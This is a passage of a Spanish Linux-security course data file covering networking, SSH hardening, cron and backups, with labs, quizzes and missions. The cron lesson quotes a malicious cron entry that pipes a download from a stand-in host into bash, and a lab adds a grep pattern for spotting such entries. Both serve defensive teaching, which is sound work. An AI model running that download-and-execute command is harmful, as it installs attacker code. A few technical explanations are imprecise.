    { type: 'multiple', question: '¿Qué comando muestra las IPs conectadas al servidor con frecuencia de conexiones?', options: ["ss -tunap", "netstat -an | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -rn", 'ip addr show connections', 'ping -count all'], correct: 1, explanation: 'Este pipeline extrae las IPs remotas de netstat/ss, las cuenta y las ordena. Fundamental para detectar ataques DDoS o escaneos.' },
  ],
  missions: [
    { id: 'm1d16', title: 'Ejecuta ip addr', description: 'Ver interfaces de red', hint: '$ ip addr', xp: 25, condition: condCmd('ip') },
    { id: 'm2d16', title: 'Haz ping al loopback', description: 'ping -c 3 127.0.0.1', hint: '$ ping -c 3 127.0.0.1', xp: 25, condition: condCmd('ping') },
    { id: 'm3d16', title: 'Lista puertos en escucha', description: 'ss -tlnp', hint: '$ ss -tlnp', xp: 35, condition: condCmd('ss') },
    { id: 'm4d16', title: 'Ve todas las conexiones', description: 'ss -tunap', hint: '$ ss -tunap', xp: 35, condition: { type: 'command_with_flag', command: 'ss', flag: '-tunap' } },
  ],
  resources: [
    { name: 'Linux Network Commands', url: 'https://www.cyberciti.biz/tips/linux-unix-bsd-network-configuration-commands.html', icon: '🌐' },
    { name: 'ss Command Tutorial', url: 'https://www.digitalocean.com/community/tutorials/how-to-use-the-ss-command', icon: '📖' },
  ],
},

// ─────────────────────────────────────────────────────────────
// DÍA 17 — SSH, SCP y Transferencia Segura
// ─────────────────────────────────────────────────────────────
{
  day: 17, title: 'SSH, SCP y Transferencia Segura',
  category: 'linux', xp: 500,
  tags: ['ssh', 'scp', 'claves', 'túneles', 'seguridad'],
  objectives: [
    'Conectarse a servidores remotos con SSH',
    'Transferir archivos con scp y sftp',
    'Configurar autenticación por clave pública',
    'Configurar /etc/ssh/sshd_config de forma segura',
    'Detectar intentos de intrusión SSH',
  ],
  theory: {
    intro: 'SSH (Secure Shell) es el protocolo estándar para administración remota de servidores Linux. Todos los administradores de sistemas y profesionales de seguridad deben dominarlo. Una mala configuración de SSH es una de las causas más comunes de compromisos de servidores.',
    sections: [
      {
        type: 'dual',
        technical: 'SSH usa criptografía asimétrica para autenticación y criptografía simétrica para el canal de datos. En el handshake: el cliente propone algoritmos, el servidor elige, se intercambian claves Diffie-Hellman para establecer una clave de sesión simétrica. La autenticación por clave usa el par público/privado RSA/Ed25519.',
        simple: 'SSH es como una línea telefónica cifrada con tu servidor. Todo lo que dices (comandos) viaja cifrado, así que aunque alguien intercepte la comunicación, solo ve ruido. La autenticación por clave es como tener una llave física: si no tienes la llave, no entras aunque conozcas la contraseña.',
      },
      {
        type: 'text',
        title: 'Configuración segura de SSH (/etc/ssh/sshd_config)',
        body: 'PermitRootLogin no: nunca permitir login directo de root. PasswordAuthentication no: forzar autenticación por clave. Port 2222: cambiar puerto (reduce ruido de bots). AllowUsers estudiante: lista blanca de usuarios. MaxAuthTries 3: limitar intentos. LoginGraceTime 30: timeout de login. Protocol 2: solo SSH v2.',
      },
      {
        type: 'note',
        label: 'Ataques SSH comunes',
        body: 'Fuerza bruta: miles de intentos de contraseña (fail2ban los bloquea). Credential stuffing: probar contraseñas filtradas de otras brechas. Man-in-the-middle: interceptar la conexión (evitado verificando el fingerprint del servidor). Clave privada robada: si tu ~/.ssh/id_rsa es robado, el atacante puede acceder a todos los servidores donde tienes la clave pública.',
      },
    ],
    realCase: {
      title: 'Hardening SSH que previno 10,000 ataques de fuerza bruta',
      body: 'Un servidor con PasswordAuthentication yes recibía 500 intentos de login por hora. Al cambiar a autenticación por clave (PasswordAuthentication no) y instalar fail2ban, los ataques cayeron a cero. La clave pública hace la fuerza bruta matemáticamente inviable: factorizar una clave RSA de 4096 bits tomaría millones de años.',
    },
  },
  commands: [
    {
      name: 'ssh',
      brief: 'Conectar a servidores remotos de forma segura',
      technical: 'Establece un canal cifrado usando TLS/SSH. Autentica con contraseña o par de claves. Multiplexa comandos sobre el canal establecido.',
      simple: 'Te conecta a otro servidor Linux como si estuvieras sentado frente a él.',
      syntax: [
        { cmd: 'ssh', arg: 'usuario@servidor',           desc: 'Conectar al servidor' },
        { cmd: 'ssh', flag: '-p 2222', arg: 'user@host', desc: 'Puerto personalizado' },
        { cmd: 'ssh', flag: '-i ~/.ssh/id_rsa', arg: 'user@host', desc: 'Clave privada específica' },
        { cmd: 'ssh', arg: 'user@host "comando"',        desc: 'Ejecutar comando remoto sin shell interactivo' },
        { cmd: 'ssh', flag: '-L 8080:localhost:80', arg: 'user@host', desc: 'Túnel SSH local' },
      ],
      errors: [
        { msg: 'Connection refused', fix: 'SSH no está corriendo en el servidor. Verifica con systemctl status ssh.' },
        { msg: 'Host key verification failed', fix: 'El fingerprint del servidor cambió. Puede ser un ataque MITM o el servidor fue reinstalado. Borra la entrada antigua de ~/.ssh/known_hosts.' },
        { msg: 'Permission denied (publickey)', fix: 'Tu clave pública no está en ~/.ssh/authorized_keys del servidor.' },
      ],
      security: 'Siempre verifica el fingerprint de la clave del servidor en la primera conexión. Un fingerprint diferente al esperado puede indicar un ataque Man-in-the-Middle.',
    },
    {
      name: 'scp',
      brief: 'Secure Copy — transferir archivos via SSH',
      technical: 'Usa el canal SSH establecido para transferir archivos. Cifrado extremo a extremo con los mismos algoritmos que SSH.',
      simple: 'Copia archivos entre tu máquina y un servidor remoto de forma cifrada. Como cp pero a través de la red.',
      syntax: [
        { cmd: 'scp', arg: 'archivo.txt usuario@servidor:/destino/', desc: 'Subir archivo al servidor' },
        { cmd: 'scp', arg: 'usuario@servidor:/ruta/archivo.txt .', desc: 'Descargar archivo del servidor' },
        { cmd: 'scp', flag: '-r', arg: 'directorio/ user@host:/dest/', desc: 'Copiar directorio completo' },
        { cmd: 'scp', flag: '-P 2222', arg: 'file user@host:/dest/', desc: 'Puerto personalizado' },
      ],
      errors: [
        { msg: 'scp: No such file or directory', fix: 'La ruta de destino no existe en el servidor remoto. Créala primero con ssh user@host "mkdir -p /destino"' },
      ],
      security: 'scp es preferible a ftp/ftps para transferencia de archivos. Todo el tráfico está cifrado. Úsalo para transferir logs, configuraciones y backups.',
    },
    {
      name: 'ssh-keygen',
      brief: 'Generar par de claves SSH',
      technical: 'Genera un par de claves asimétricas. La privada (id_rsa/id_ed25519) queda en ~/.ssh/ con permisos 600. La pública (id_rsa.pub) se copia al servidor.',
      simple: 'Crea tu "llave digital" SSH. La llave privada la guardas tú, la pública la pones en el servidor.',
      syntax: [
        { cmd: 'ssh-keygen', flag: '-t ed25519',                    desc: 'Generar clave Ed25519 (recomendado)' },
        { cmd: 'ssh-keygen', flag: '-t rsa -b 4096',               desc: 'Generar clave RSA 4096 bits' },
        { cmd: 'ssh-copy-id', arg: 'usuario@servidor',             desc: 'Copiar clave pública al servidor' },
        { cmd: 'cat ~/.ssh/id_ed25519.pub',                        desc: 'Ver tu clave pública' },
      ],
      errors: [],
      security: 'Protege tu clave privada con passphrase. chmod 600 ~/.ssh/id_rsa es obligatorio. Si alguien obtiene tu clave privada sin passphrase, tiene acceso a todos tus servidores.',
    },
  ],
  lab: {
    title: 'Configurar y auditar SSH en el servidor',
    context: 'Debes auditar la configuración SSH del servidor para asegurarte de que cumple las mejores prácticas de seguridad.',
    duration: '30 min', xp: 150,
    steps: [
      {
        title: 'Revisa la configuración SSH',
        body: 'Lee el archivo de configuración del servidor SSH.',
        commands: [{ cmd: 'cat /etc/ssh/sshd_config', explanation: 'Ver la configuración del servidor SSH.' }],
        expected: 'Port 22\nPermitRootLogin prohibit-password\nPubkeyAuthentication yes',
        technical: 'sshd_config controla el comportamiento del servidor SSH. Cada directiva incorrecta es una vulnerabilidad potencial.',
        hints: ['$ cat /etc/ssh/sshd_config'],
      },
      {
        title: 'Filtra configuración activa',
        body: 'Ve solo las directivas activas (sin comentarios).',
        commands: [{ cmd: "grep -v '^#' /etc/ssh/sshd_config | grep -v '^$'", explanation: 'Elimina comentarios y líneas vacías.' }],
        expected: 'Port 22\nPermitRootLogin prohibit-password\nPubkeyAuthentication yes',
        technical: '^# elimina líneas de comentarios. ^$ elimina líneas vacías. El resultado muestra la configuración activa real.',
        hints: ["$ grep -v '^#' /etc/ssh/sshd_config | grep -v '^$'"],
      },
      {
        title: 'Verifica si PermitRootLogin está configurado',
        body: 'Confirma que el login de root por SSH está restringido.',
        commands: [{ cmd: "grep 'PermitRootLogin' /etc/ssh/sshd_config", explanation: 'Busca la directiva de login de root.' }],
        expected: 'PermitRootLogin prohibit-password',
        technical: 'prohibit-password permite root solo con clave pública (no contraseña). no lo prohíbe completamente. yes es peligroso.',
        hints: ["$ grep 'PermitRootLogin' /etc/ssh/sshd_config"],
      },
      {
        title: 'Revisa los logs de autenticación SSH',
        body: 'Busca intentos de login fallidos.',
        commands: [{ cmd: "grep 'Failed password' /var/log/auth.log", explanation: 'Encuentra intentos fallidos de autenticación.' }],
        expected: 'sshd[892]: Failed password for invalid user admin',
        technical: 'Failed password en auth.log indica intento de fuerza bruta. El origen IP es el campo después de "from".',
        hints: ["$ grep 'Failed password' /var/log/auth.log"],
      },
      {
        title: 'Revisa el archivo known_hosts',
        body: 'Ve los servidores SSH a los que te has conectado antes.',
        commands: [{ cmd: 'cat ~/.ssh/known_hosts 2>/dev/null || echo "No hay conexiones previas"', explanation: 'Lista de fingerprints de servidores conocidos.' }],
        expected: 'linux-academy ssh-rsa AAAA...',
        technical: 'known_hosts almacena los fingerprints de servidores conocidos. Si un fingerprint cambia, SSH alerta (posible MITM).',
        hints: ['$ cat ~/.ssh/known_hosts'],
      },
    ],
    commonErrors: [
      { error: 'ssh: connect to host port 22: Connection refused', solution: 'El servicio SSH no está corriendo. Verifica: systemctl status ssh' },
    ],
  },
  quiz: [
    { type: 'multiple', question: '¿Qué directiva en sshd_config deshabilita completamente el login de root por SSH?', options: ['RootLogin false', 'PermitRootLogin no', 'DenyRoot yes', 'BlockRoot on'], correct: 1, explanation: 'PermitRootLogin no es la directiva correcta. Es una de las configuraciones de hardening más importantes para cualquier servidor Linux.' },
    { type: 'fill', question: 'Para generar un par de claves SSH con el algoritmo más moderno: `ssh-keygen -t ___`', correct: ['ed25519'], explanation: 'Ed25519 es el algoritmo más moderno y seguro para SSH. Es más corto que RSA y más difícil de atacar.' },
    { type: 'true_false', question: '`scp` cifra los archivos durante la transferencia.', correct: true, explanation: 'scp usa el mismo canal cifrado que SSH. Todo el contenido transferido está cifrado extremo a extremo.' },
    { type: 'multiple', question: '¿Qué indica "Failed password for root from 185.x.x.x" en /var/log/auth.log?', options: ['Root se conectó exitosamente', 'Un ataque de fuerza bruta SSH hacia root', 'Un error de configuración', 'La contraseña de root expiró'], correct: 1, explanation: 'Failed password indica intento fallido. Si aparece repetidamente desde la misma IP, es un ataque de fuerza bruta.' },
    { type: 'multiple', question: '¿Por qué es recomendable usar autenticación por clave pública en lugar de contraseña?', options: ['Es más fácil de recordar', 'Una clave de 4096 bits es matemáticamente imposible de forzar', 'Es más rápido conectarse', 'No requiere contraseña'], correct: 1, explanation: 'Una clave RSA de 4096 bits tomaría siglos de computación para factorizarse. La fuerza bruta es inviable, a diferencia de contraseñas cortas.' },
  ],
  missions: [
    { id: 'm1d17', title: 'Lee la config de SSH', description: 'cat /etc/ssh/sshd_config', hint: '$ cat /etc/ssh/sshd_config', xp: 25, condition: { type: 'command_executed', command: 'cat /etc/ssh/sshd_config' } },
    { id: 'm2d17', title: 'Filtra config activa SSH', description: "grep -v '^#' sshd_config", hint: "$ grep -v '^#' /etc/ssh/sshd_config | grep -v '^$'", xp: 35, condition: { type: 'command_executed', command: "grep -v '^#' /etc/ssh/sshd_config" } },
    { id: 'm3d17', title: 'Busca PermitRootLogin', description: "grep PermitRootLogin en sshd_config", hint: "$ grep 'PermitRootLogin' /etc/ssh/sshd_config", xp: 30, condition: { type: 'command_executed', command: "grep 'PermitRootLogin' /etc/ssh/sshd_config" } },
    { id: 'm4d17', title: 'Busca intentos fallidos SSH', description: "grep 'Failed password' auth.log", hint: "$ grep 'Failed password' /var/log/auth.log", xp: 40, condition: { type: 'command_executed', command: "grep 'Failed password' /var/log/auth.log" } },
  ],
  resources: [
    { name: 'SSH Academy', url: 'https://www.ssh.com/academy/ssh', icon: '🔐' },
    { name: 'OpenSSH Security', url: 'https://www.openssh.com/security.html', icon: '🛡️' },
  ],
},

// ─────────────────────────────────────────────────────────────
// DÍA 18 — Cron, Automatización y Tareas Programadas
// ─────────────────────────────────────────────────────────────
{
  day: 18, title: 'Cron, Automatización y Tareas Programadas',
  category: 'bash', xp: 500,
  tags: ['cron', 'crontab', 'automatización', 'tareas', 'at'],
  objectives: [
    'Entender el formato de crontab',
    'Programar tareas automáticas con crontab',
    'Crear scripts de mantenimiento automático',
    'Detectar cron jobs maliciosos',
    'Usar at para tareas de una sola vez',
  ],
  theory: {
    intro: 'Cron es el programador de tareas de Linux. Cualquier tarea repetitiva — backups, limpieza de logs, actualizaciones, monitoreo — debería automatizarse con cron. Los profesionales de seguridad también deben saber detectar cron jobs maliciosos instalados por atacantes.',
    sections: [
      {
        type: 'dual',
        technical: 'crond es un daemon que lee los archivos crontab de /var/spool/cron/crontabs/ y /etc/cron.d/ y ejecuta los trabajos según su schedule. El formato de cada línea es: minuto hora día_mes mes día_semana comando. cron usa cinco campos de tiempo antes del comando.',
        simple: 'Cron es como un despertador programable para comandos. Puedes decirle "ejecuta este script todos los días a las 3am" o "cada lunes a las 6pm" y lo hará sin que tengas que estar presente.',
      },
      {
        type: 'text',
        title: 'Formato de crontab',
        body: '* * * * * comando → mínuto(0-59) hora(0-23) día_del_mes(1-31) mes(1-12) día_semana(0-7). Ejemplos: 0 2 * * * → todos los días a las 2am. */5 * * * * → cada 5 minutos. 0 9 * * 1 → los lunes a las 9am. 0 0 1 * * → el día 1 de cada mes. @reboot → al iniciar el sistema.',
      },
      {
        type: 'note',
        label: 'Cron jobs maliciosos (Persistence)',
        body: 'Los atacantes usan cron para mantener persistencia: instalan un cron job que descarga y ejecuta malware periódicamente. Ubicaciones a revisar: crontab -l, /etc/cron.d/, /etc/cron.daily/, /var/spool/cron/crontabs/. Señales de alarma: comandos que descargan de internet (curl, wget), scripts en /tmp, ofuscación base64.',
      },
    ],
    diagram: {
      title: 'Formato de crontab con ejemplos',
      content: `# ┌─────────── minuto (0-59)
# │  ┌──────── hora (0-23)
# │  │  ┌───── día del mes (1-31)
# │  │  │  ┌── mes (1-12)
# │  │  │  │  ┌─ día semana (0=dom, 1=lun...6=sáb)
# │  │  │  │  │
# *  *  *  *  *  comando

  0  2  *  *  *  /home/estudiante/scripts/backup.sh
 */5  *  *  *  *  /scripts/monitoreo.sh
  0  9  *  *  1  /scripts/reporte_semanal.sh
  0  0  1  *  *  /scripts/limpieza_mensual.sh
@reboot            /scripts/inicio.sh`,
    },
    realCase: {
      title: 'Detectar persistencia vía cron en un servidor comprometido',
      body: "Tras el análisis forense de un servidor hackeado, se encontró: */5 * * * * curl -s http://malicioso.com/payload | bash. Este cron job descargaba y ejecutaba código malicioso cada 5 minutos. Aunque el proceso fuera eliminado, volvía en 5 minutos. La persistencia via cron es una de las técnicas más comunes de los atacantes.",
    },
  },
  commands: [
    {
      name: 'crontab',
      brief: 'Gestionar el crontab del usuario',
      technical: 'Edita /var/spool/cron/crontabs/usuario. crond lee estos archivos periódicamente y ejecuta los trabajos según el schedule.',
      simple: 'Programa comandos para que se ejecuten automáticamente en momentos específicos.',
      syntax: [
        { cmd: 'crontab', flag: '-l',              desc: 'Listar cron jobs actuales' },
        { cmd: 'crontab', flag: '-e',              desc: 'Editar el crontab (abre editor)' },
        { cmd: 'crontab', flag: '-r',              desc: 'Eliminar TODOS los cron jobs (¡cuidado!)' },
        { cmd: 'crontab', flag: '-l', arg: '-u root', desc: 'Ver crontab de otro usuario (root)' },
      ],
      errors: [
        { msg: 'no crontab for usuario', fix: 'El usuario no tiene cron jobs. Es normal en la primera ejecución.' },
      ],
      security: 'crontab -l -u root muestra los cron jobs de root. Cron jobs de root que ejecutan scripts de /tmp o descarguen de internet son backdoors.',
    },
    {
      name: 'Directorios cron del sistema',
      brief: 'Cron jobs del sistema en /etc/cron.*',
      technical: 'crond ejecuta automáticamente scripts en /etc/cron.hourly/, /etc/cron.daily/, /etc/cron.weekly/, /etc/cron.monthly/. /etc/cron.d/ permite formato crontab completo.',
      simple: 'El sistema tiene carpetas predefinidas para ejecutar scripts cada hora, día, semana o mes. Solo copia tu script ahí.',
      syntax: [
        { cmd: 'ls /etc/cron.daily/',  desc: 'Scripts que corren diariamente' },
        { cmd: 'ls /etc/cron.d/',      desc: 'Cron jobs con formato completo' },
        { cmd: 'ls /var/spool/cron/crontabs/', desc: 'Crontabs de todos los usuarios' },
      ],
      errors: [],
      security: 'Los atacantes también colocan scripts en /etc/cron.d/ para persistencia. Revisa estos directorios regularmente: ls -la /etc/cron.*',
    },
  ],
  lab: {
    title: 'Crear y auditar cron jobs de mantenimiento',
    context: 'Necesitas automatizar tareas de mantenimiento del servidor: backup diario, limpieza de /tmp y un reporte semanal. También debes auditar los cron jobs existentes.',
    duration: '30 min', xp: 150,
    steps: [
      {
        title: 'Lista los cron jobs existentes',
        body: 'Revisa qué tareas automáticas están programadas.',
        commands: [{ cmd: 'crontab -l', explanation: 'Lista los cron jobs del usuario actual.' }],
        expected: '# Crontab del usuario estudiante\n0 2 * * * /home/estudiante/scripts/backup.sh',
        technical: 'Revisar crontab -l regularmente es parte del hardening. En sistemas comprometidos, los atacantes añaden entradas aquí.',
        hints: ['$ crontab -l'],
      },
      {
        title: 'Revisa los cron jobs del sistema',
        body: 'Inspecciona los directorios de cron del sistema.',
        commands: [
          { cmd: 'ls -la /etc/cron.d/', explanation: 'Cron jobs del sistema con formato completo.' },
          { cmd: 'ls -la /etc/cron.daily/', explanation: 'Scripts que corren diariamente.' },
        ],
        expected: 'apt-daily  logrotate  man-db',
        technical: '/etc/cron.daily/ contiene scripts de mantenimiento del sistema. logrotate rota logs, apt-daily actualiza índices.',
        hints: ['$ ls -la /etc/cron.d/', '$ ls -la /etc/cron.daily/'],
      },
      {
        title: 'Crea un script de backup',
        body: 'Crea el script que programarás en cron.',
        commands: [
          { cmd: "echo '#!/bin/bash\nFECHA=$(date +%Y%m%d)\ntar -czf /tmp/backup_$FECHA.tar.gz ~/documentos\necho \"Backup completado: backup_$FECHA.tar.gz\"' > ~/scripts/backup.sh", explanation: 'Script de backup con fecha.' },
          { cmd: 'chmod +x ~/scripts/backup.sh', explanation: 'Permisos de ejecución.' },
        ],
        expected: 'Script backup.sh creado con permisos de ejecución',
        technical: 'El script usa la fecha en el nombre del archivo para no sobreescribir backups anteriores.',
        hints: ['Crea el script con echo y dale chmod +x'],
      },
      {
        title: 'Verifica el script de backup',
        body: 'Prueba el script antes de programarlo en cron.',
        commands: [{ cmd: 'bash ~/scripts/backup.sh', explanation: 'Ejecutar el script manualmente para verificarlo.' }],
        expected: 'Backup completado: backup_20240115.tar.gz',
        technical: 'SIEMPRE prueba un script manualmente antes de añadirlo a cron. Un script con errores en cron falla silenciosamente.',
        hints: ['$ bash ~/scripts/backup.sh'],
      },
      {
        title: 'Busca cron jobs sospechosos',
        body: 'Detecta patrones maliciosos en cron jobs.',
        commands: [{ cmd: "crontab -l | grep -E 'curl|wget|/tmp|base64'", explanation: 'Busca patrones típicos de cron maliciosos.' }],
        expected: '(sin resultados en sistema limpio)',
        technical: 'curl/wget en cron descarga payloads. /tmp en cron ejecuta malware temporal. base64 decodifica y ejecuta código ofuscado.',
        hints: ["$ crontab -l | grep -E 'curl|wget|/tmp'"],
      },
    ],
    commonErrors: [
      { error: 'No newline at end of crontab', solution: 'El archivo crontab debe terminar con una línea en blanco. Añade una línea vacía al final.' },
      { error: 'Script funciona manual pero no en cron', solution: 'Cron tiene un PATH limitado. Usa rutas absolutas en los scripts o define PATH al inicio del crontab.' },
    ],
  },
  quiz: [
    { type: 'fill', question: 'Para ejecutar un cron job todos los días a las 3am: `0 ___ * * * /script.sh`', correct: ['3'], explanation: 'Formato: minuto hora día mes día_semana. 0 3 = minuto 0, hora 3 = 3:00am.' },
    { type: 'multiple', question: '¿Qué hace `crontab -r`?', options: ['Lista los cron jobs', 'Edita el crontab', 'Elimina TODOS los cron jobs del usuario', 'Recarga el daemon cron'], correct: 2, explanation: 'crontab -r elimina todos los cron jobs sin confirmación. Es un comando peligroso que no se puede deshacer.' },
    { type: 'true_false', question: 'Un cron job que ejecuta `curl URL | bash` es una señal de malware potencial.', correct: true, explanation: 'curl URL | bash descarga y ejecuta código directamente. Es una técnica de malware para mantener persistencia o actualizar payloads.' },
    { type: 'multiple', question: '¿Dónde colocarías un script para que se ejecute automáticamente cada día sin editar crontab?', options: ['/etc/cron.d/', '/etc/cron.daily/', '/var/cron/', '/tmp/cron/'], correct: 1, explanation: '/etc/cron.daily/ contiene scripts que crond ejecuta automáticamente cada día. No necesitas formato crontab, solo poner el script ahí con chmod +x.' },
    { type: 'fill', question: 'Para listar los cron jobs del usuario actual: `crontab ___`', correct: ['-l'], explanation: 'crontab -l (list) muestra los cron jobs del usuario actual.' },
  ],
  missions: [
    { id: 'm1d18', title: 'Lista los cron jobs', description: 'crontab -l', hint: '$ crontab -l', xp: 25, condition: condCmd('crontab') },
    { id: 'm2d18', title: 'Revisa /etc/cron.daily/', description: 'ls /etc/cron.daily/', hint: '$ ls /etc/cron.daily/', xp: 25, condition: { type: 'command_executed', command: 'ls /etc/cron.daily/' } },
    { id: 'm3d18', title: 'Crea el script backup.sh', description: 'Script con fecha en el nombre', hint: '$ touch ~/scripts/backup.sh', xp: 35, condition: condFile('~/scripts/backup.sh') },
    { id: 'm4d18', title: 'Detecta cron jobs sospechosos', description: "crontab -l | grep curl|wget", hint: "$ crontab -l | grep -E 'curl|wget|/tmp'", xp: 40, condition: { type: 'command_executed', command: "crontab -l | grep -E 'curl|wget|/tmp'" } },
  ],
  resources: [
    { name: 'Crontab Guru (generador visual)', url: 'https://crontab.guru', icon: '🕐' },
    { name: 'Linux Cron Guide', url: 'https://www.digitalocean.com/community/tutorials/how-to-use-cron-to-automate-tasks-ubuntu-1804', icon: '📖' },
  ],
},

// ─────────────────────────────────────────────────────────────
// DÍA 19 — Compresión, Backups y Archivos
// ─────────────────────────────────────────────────────────────
{
  day: 19, title: 'Compresión, Backups y Archivos',
  category: 'linux', xp: 500,
  tags: ['tar', 'gzip', 'backup', 'compresión', 'rsync'],
  objectives: [
    'Comprimir y descomprimir archivos con gzip y tar',
    'Crear backups completos e incrementales',
    'Sincronizar directorios con rsync',
    'Verificar la integridad de backups con checksums',
    'Automatizar backups con scripts y cron',
  ],
  theory: {
    intro: 'Los backups son la última línea de defensa ante ransomware, fallos de hardware y errores humanos. Un servidor sin backup es un servidor a punto de perder todos sus datos. Un profesional de sistemas que no hace backups no es un profesional.',
    sections: [
      {
        type: 'dual',
        technical: 'tar (Tape ARchive) combina múltiples archivos en uno (sin comprimir). gzip/bzip2/xz comprimen un solo archivo. La combinación tar.gz (o tgz) archiva Y comprime. rsync usa el algoritmo delta para transferir solo los bytes que cambiaron, minimizando el ancho de banda.',
        simple: 'tar es como meter ropa en una maleta (agrupa archivos). gzip es como usar una máquina de vacío para comprimir la maleta. juntos (tar.gz) agrupas y comprimes. rsync es como sincronizar una carpeta con una copia: solo copia lo que cambió.',
      },
      {
        type: 'text',
        title: 'Estrategia de backups: regla 3-2-1',
        body: '3 copias de los datos: el original + 2 backups. 2 medios diferentes: por ejemplo disco duro + cloud. 1 copia offsite: fuera de las instalaciones físicas. Esta estrategia protege contra: fallos de hardware (copia local), desastres físicos (copia offsite) y ransomware (copia aislada).',
      },
      {
        type: 'note',
        label: 'Checksums para verificar integridad',
        body: 'md5sum/sha256sum calcula el hash de un archivo. Si el backup tiene el mismo hash que el original, no fue corrupto ni modificado. En forense digital, los checksums son la prueba de que la evidencia no fue alterada. sha256sum es preferido sobre md5sum (más seguro).',
      },
    ],
    realCase: {
      title: 'Recuperación ante ataque de ransomware gracias a backups offline',
      body: "Un hospital sufrió un ataque de ransomware que cifró todos los servidores. Los backups online también fueron cifrados. Sin embargo, tenían backups offline en cinta magnética siguiendo la regla 3-2-1. Recuperaron todos los datos en 6 horas en lugar de pagar el rescate de $500,000. Los backups offline son inmunes al ransomware.",
    },
  },
  commands: [
    {
      name: 'tar',
      brief: 'Tape Archive — crear y extraer archivos comprimidos',
      technical: 'tar agrupa archivos preservando metadatos (permisos, propietario, timestamps). Con -z/-j/-J usa gzip/bzip2/xz para comprimir.',
      simple: 'La herramienta más usada en Linux para crear backups y comprimir directorios.',
      syntax: [
        { cmd: 'tar', flag: '-czf', arg: 'backup.tar.gz directorio/', desc: 'Crear backup comprimido' },
        { cmd: 'tar', flag: '-xzf', arg: 'backup.tar.gz',           desc: 'Extraer backup' },
        { cmd: 'tar', flag: '-tzf', arg: 'backup.tar.gz',           desc: 'Listar contenido sin extraer' },
        { cmd: 'tar', flag: '-czf', arg: 'backup.tar.gz --exclude="*.log" dir/', desc: 'Excluir archivos' },
        { cmd: 'tar', flag: '-czpf', arg: 'backup.tar.gz dir/',     desc: '-p preserva permisos' },
      ],
      errors: [
        { msg: "tar: Cannot stat 'dir': No such file", fix: 'El directorio a comprimir no existe. Verifica la ruta.' },
      ],
      security: 'Verifica siempre el contenido de un tar antes de extraerlo: tar -tzf archivo.tar.gz. Un tar malicioso puede usar rutas absolutas o ../ para sobreescribir archivos del sistema.',
    },
    {
      name: 'sha256sum',
      brief: 'Calcular y verificar checksums SHA-256',
      technical: 'Calcula el hash SHA-256 del archivo. SHA-256 produce un digest de 256 bits (64 hex). Cualquier modificación al archivo cambia el hash completamente.',
      simple: 'Genera una "huella digital" del archivo. Si el archivo cambia mínimamente, la huella cambia completamente. Sirve para verificar que un archivo no fue alterado.',
      syntax: [
        { cmd: 'sha256sum', arg: 'archivo.tar.gz',                desc: 'Calcular hash del archivo' },
        { cmd: 'sha256sum', arg: 'archivo.tar.gz > hash.txt',     desc: 'Guardar hash en archivo' },
        { cmd: 'sha256sum', flag: '-c', arg: 'hash.txt',          desc: 'Verificar integridad' },
        { cmd: 'md5sum', arg: 'archivo',                           desc: 'Hash MD5 (menos seguro, más rápido)' },
      ],
      errors: [],
      security: 'En forense digital, sha256sum es la primera operación sobre evidencia. El hash es la prueba de que no fue alterada.',
    },
    {
      name: 'rsync',
      brief: 'Sincronización eficiente de archivos y directorios',
      technical: 'Usa el algoritmo rsync: divide archivos en bloques, calcula checksums, y transfiere solo los bloques que difieren. Mucho más eficiente que cp para actualizaciones.',
      simple: 'Copia solo lo que cambió desde la última vez. Si tienes 10GB de datos y solo cambiaron 100MB, rsync transfiere solo esos 100MB.',
      syntax: [
        { cmd: 'rsync', flag: '-av', arg: 'origen/ destino/', desc: 'Sincronizar local con verbose' },
        { cmd: 'rsync', flag: '-avz', arg: 'dir/ user@host:/backup/', desc: 'Sincronizar a servidor remoto' },
        { cmd: 'rsync', flag: '--delete', arg: '-av src/ dst/', desc: 'Eliminar en destino lo que no está en origen' },
        { cmd: 'rsync', flag: '--dry-run', arg: '-av src/ dst/', desc: 'Simular sin ejecutar' },
      ],
      errors: [
        { msg: 'rsync: connection unexpectedly closed', fix: 'Problema de red o SSH. Verifica la conectividad con ssh primero.' },
      ],
      security: 'rsync --delete es peligroso si confundes origen y destino. Usa --dry-run primero para ver qué se haría.',
    },
  ],
  lab: {
    title: 'Sistema de backup automático con verificación de integridad',
    context: 'Implementa un sistema de backup para el servidor que incluye compresión, verificación de integridad y registro de operaciones.',
    duration: '30 min', xp: 150,
    steps: [
      {
        title: 'Crea un backup del directorio home',
        body: 'Comprime tu directorio de documentos en un backup.',
        commands: [
          { cmd: 'tar -czf /tmp/backup_$(date +%Y%m%d).tar.gz ~/documentos/', explanation: 'Crea backup con fecha en el nombre.' },
        ],
        expected: 'Archivo backup_20240115.tar.gz creado en /tmp',
        technical: 'La expansión $(date +%Y%m%d) genera la fecha actual. El nombre incluye la fecha para identificar cuándo se hizo.',
        hints: ['$ tar -czf /tmp/backup_$(date +%Y%m%d).tar.gz ~/documentos/'],
      },
      {
        title: 'Lista el contenido del backup',
        body: 'Verifica qué archivos contiene el backup sin extraerlo.',
        commands: [{ cmd: 'tar -tzf /tmp/backup_*.tar.gz', explanation: '-t lista el contenido, -z descomprime gzip, -f especifica el archivo.' }],
        expected: 'home/estudiante/documentos/README.txt',
        technical: 'tar -t es esencial antes de extraer: verifica que el backup contiene lo esperado y no tiene rutas maliciosas.',
        hints: ['$ tar -tzf /tmp/backup_*.tar.gz'],
      },
      {
        title: 'Calcula el checksum del backup',
        body: 'Genera el hash SHA-256 para verificar integridad futura.',
        commands: [
          { cmd: 'sha256sum /tmp/backup_*.tar.gz', explanation: 'Genera el hash SHA-256 del backup.' },
          { cmd: 'sha256sum /tmp/backup_*.tar.gz > /tmp/backup.sha256', explanation: 'Guarda el hash para verificación posterior.' },
        ],
        expected: 'abc123...def456  /tmp/backup_20240115.tar.gz',
        technical: 'Guarda siempre el checksum junto al backup. Si el backup se corrompe o modifica, el hash no coincidirá.',
        hints: ['$ sha256sum /tmp/backup_*.tar.gz > /tmp/backup.sha256'],
      },
      {
        title: 'Verifica la integridad del backup',
        body: 'Confirma que el backup no está corrupto usando el checksum guardado.',
        commands: [{ cmd: 'sha256sum -c /tmp/backup.sha256', explanation: '-c verifica el checksum contra el archivo.' }],
        expected: '/tmp/backup_20240115.tar.gz: OK',
        technical: 'OK confirma que el hash coincide y el archivo no fue alterado. FAILED indicaría corrupción o modificación.',
        hints: ['$ sha256sum -c /tmp/backup.sha256'],
      },
      {
        title: 'Crea el script de backup completo',
        body: 'Automatiza todo el proceso en un script.',
        commands: [
